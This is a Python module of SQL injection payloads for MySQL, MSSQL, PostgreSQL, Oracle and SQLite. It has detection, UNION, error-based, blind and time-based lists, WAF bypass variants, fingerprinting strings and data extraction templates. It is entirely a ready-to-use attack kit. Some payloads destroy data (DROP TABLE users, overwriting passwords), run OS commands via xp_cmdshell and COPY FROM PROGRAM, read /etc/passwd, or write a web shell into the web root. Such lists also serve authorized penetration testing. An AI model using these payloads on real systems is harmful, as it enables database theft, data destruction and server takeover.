"""
SQL Injection Payloads - All Database Types
Includes WAF bypass techniques
"""

# Basic SQLi Detection
SQLI_PAYLOADS = {
    "detection": [
        "'",
        "''",
        "\"",
        "\"\"",
        "`",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "\" OR \"1\"=\"1",
        "\" OR 1=1--",
        "') OR ('1'='1",
        "')) OR (('1'='1",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "1 UNION SELECT NULL--",
        "1' UNION SELECT NULL--",
        "-1' UNION SELECT 1,2,3--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1'; SELECT SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1; SELECT pg_sleep(5)--",
    ],

    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "0 UNION SELECT 1,2,3--",
        "-1 UNION SELECT 1,2,3--",
        "1' UNION SELECT username,password FROM users--",
        "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "1' UNION SELECT column_name,NULL FROM information_schema.columns--",
    ],

    "error_based": [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXP(~(SELECT * FROM (SELECT version())a))--",
        "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(version())) USING utf8)))--",
        "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
    ],

    "blind_boolean": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
        "' AND (SELECT LENGTH(database()))>5--",
        "1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--",
    ],

    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "' AND SLEEP(5)--",
        "' AND (SELECT SLEEP(5))--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "' AND IF(1=2,SLEEP(5),0)--",
        "1; SELECT pg_sleep(5)--",
        "1' AND pg_sleep(5)--",
        "'; DBMS_LOCK.SLEEP(5);--",
        "' AND BENCHMARK(10000000,SHA1('test'))--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
    ],

    "stacked_queries": [
        "'; INSERT INTO users VALUES('hacked','hacked')--",
        "'; DROP TABLE users--",
        "'; UPDATE users SET password='hacked'--",
        "'; CREATE TABLE test(id INT)--",
        "'; EXEC xp_cmdshell('whoami')--",
        "'; EXEC sp_configure 'show advanced options',1--",
    ],

    "mysql": [
        "' UNION SELECT @@version--",
        "' UNION SELECT user()--",
        "' UNION SELECT database()--",
        "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/shell.php'--",
        "' AND ORD(MID((SELECT IFNULL(CAST(schema_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),1,1))>64--",
    ],

    "mssql": [
        "' UNION SELECT @@version--",
        "' UNION SELECT name FROM master..sysdatabases--",
        "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
        "'; EXEC xp_cmdshell('dir')--",
        "'; EXEC sp_makewebtask 'c:\\inetpub\\wwwroot\\shell.asp','SELECT 1'--",
        "' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--",
        "'; DECLARE @q VARCHAR(8000);SELECT @q=0x73656C656374;EXEC(@q)--",
    ],

    "postgresql": [
        "' UNION SELECT version()--",
        "' UNION SELECT current_database()--",
        "' UNION SELECT current_user--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "'; CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'id';--",
        "' AND 1=CAST((SELECT version()) AS INT)--",
        "'; SELECT lo_import('/etc/passwd');--",
    ],

    "oracle": [
        "' UNION SELECT banner FROM v$version--",
        "' UNION SELECT user FROM dual--",
        "' UNION SELECT table_name FROM all_tables--",
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--",
        "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--",
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
    ],

    "sqlite": [
        "' UNION SELECT sqlite_version()--",
        "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
        "' UNION SELECT sql FROM sqlite_master--",
        "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))--",
    ],
}

# WAF Bypass Techniques
SQLI_WAF_BYPASS = {
    "case_variation": [
        "' uNiOn SeLeCt NuLl--",
        "' UnIoN sElEcT nUlL--",
        "' UNION SELECT NULL--",
    ],

    "comments": [
        "'/**/UNION/**/SELECT/**/NULL--",
        "' /*!UNION*/ /*!SELECT*/ NULL--",
        "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
        "'/**/UN/**/ION/**/SE/**/LECT/**/NULL--",
        "' UNION--\nSELECT NULL--",
        "' UNION#\nSELECT NULL--",
    ],

    "encoding": [
        "'%20UNION%20SELECT%20NULL--",
        "'%0aUNION%0aSELECT%0aNULL--",
        "'%0dUNION%0dSELECT%0dNULL--",
        "'%09UNION%09SELECT%09NULL--",
        "'%00UNION%00SELECT%00NULL--",
        "%27%20UNION%20SELECT%20NULL--",
        "%2527%20UNION%20SELECT%20NULL--",  # Double URL encode
    ],

    "unicode": [
        "' UN%u0049ON SELECT NULL--",
        "' UNI%u004FN SELECT NULL--",
        "%uff07%20UNION%20SELECT%20NULL--",  # Full-width quote
    ],

    "whitespace_alternatives": [
        "'%0bUNION%0bSELECT%0bNULL--",
        "'%0cUNION%0cSELECT%0cNULL--",
        "'%a0UNION%a0SELECT%a0NULL--",
        "'+UNION+SELECT+NULL--",
        "' UNION\tSELECT\tNULL--",
        "' UNION\nSELECT\nNULL--",
        "' UNION\rSELECT\rNULL--",
    ],

    "keyword_splitting": [
        "' UNI/**/ON SEL/**/ECT NULL--",
        "' /*!UNION*/ /*!SELECT*/ NULL--",
        "' UN%00ION SEL%00ECT NULL--",
    ],

    "alternative_keywords": [
        "' UNION ALL SELECT NULL--",
        "' UNION DISTINCT SELECT NULL--",
        "' /*!12345UNION*/ /*!12345SELECT*/ NULL--",
    ],

    "function_alternatives": [
        "' AND MID(version(),1,1)='5'--",  # Instead of SUBSTRING
        "' AND LEFT(version(),1)='5'--",
        "' AND SUBSTR(version(),1,1)='5'--",
        "' AND INSTR(version(),'5')>0--",
    ],

    "no_spaces": [
        "'UNION(SELECT(NULL))--",
        "'UNION(SELECT(NULL),NULL)--",
        "'AND(1=1)--",
        "'OR(1=1)--",
    ],

    "scientific_notation": [
        "' AND 1e0=1e0--",
        "' UNION SELECT 1e0--",
        "0e0' UNION SELECT NULL--",
    ],

    "hex_encoding": [
        "' UNION SELECT 0x61646d696e--",  # 'admin' in hex
        "' AND 0x1=0x1--",
        "' UNION SELECT CHAR(97,100,109,105,110)--",
    ],
}

# Database fingerprinting payloads
SQLI_FINGERPRINT = {
    "mysql": "' AND 'mysql'='my'+'sql",
    "mssql": "' AND 'mssql'='ms'+'sql",
    "oracle": "' AND 'oracle'='ora'||'cle",
    "postgresql": "' AND 'pg'='p'||'g",
    "sqlite": "' AND sqlite_version()!=''--",
}

# Data extraction templates
SQLI_EXTRACTION = {
    "mysql": {
        "version": "SELECT @@version",
        "user": "SELECT user()",
        "database": "SELECT database()",
        "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
        "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        "data": "SELECT {columns} FROM {table} LIMIT {limit}",
    },
    "mssql": {
        "version": "SELECT @@version",
        "user": "SELECT SYSTEM_USER",
        "database": "SELECT DB_NAME()",
        "tables": "SELECT name FROM sysobjects WHERE xtype='U'",
        "columns": "SELECT name FROM syscolumns WHERE id=OBJECT_ID('{table}')",
        "data": "SELECT TOP {limit} {columns} FROM {table}",
    },
    "postgresql": {
        "version": "SELECT version()",
        "user": "SELECT current_user",
        "database": "SELECT current_database()",
        "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema='public'",
        "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        "data": "SELECT {columns} FROM {table} LIMIT {limit}",
    },
    "oracle": {
        "version": "SELECT banner FROM v$version WHERE ROWNUM=1",
        "user": "SELECT user FROM dual",
        "database": "SELECT ora_database_name FROM dual",
        "tables": "SELECT table_name FROM all_tables WHERE ROWNUM<=50",
        "columns": "SELECT column_name FROM all_tab_columns WHERE table_name='{table}'",
        "data": "SELECT {columns} FROM {table} WHERE ROWNUM<={limit}",
    },
    "sqlite": {
        "version": "SELECT sqlite_version()",
        "tables": "SELECT name FROM sqlite_master WHERE type='table'",
        "columns": "SELECT sql FROM sqlite_master WHERE name='{table}'",
        "data": "SELECT {columns} FROM {table} LIMIT {limit}",
    },
}
